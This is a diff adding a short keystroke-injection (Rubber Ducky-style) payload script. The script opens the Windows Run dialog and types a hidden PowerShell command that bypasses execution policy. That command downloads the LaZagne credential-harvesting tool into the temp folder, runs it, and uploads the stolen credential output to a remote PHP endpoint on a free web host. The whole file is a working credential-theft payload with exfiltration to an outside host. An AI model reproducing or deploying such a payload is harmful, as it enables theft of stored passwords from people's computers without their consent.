@@ -1,0 +1,7 @@
+REM Opens lazagne, saves output to PHP file on webserver.
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://pwningstuff',\"$env:temp\laz.exe\")
+STRING ; $output = & $env:temp\laz.exe\ | Out-String; (New-Object Net.WebClient).UploadString('https://pwningstuff.000webhostapp.com/upload/creds/rxc.php', $output)"
+ENTER
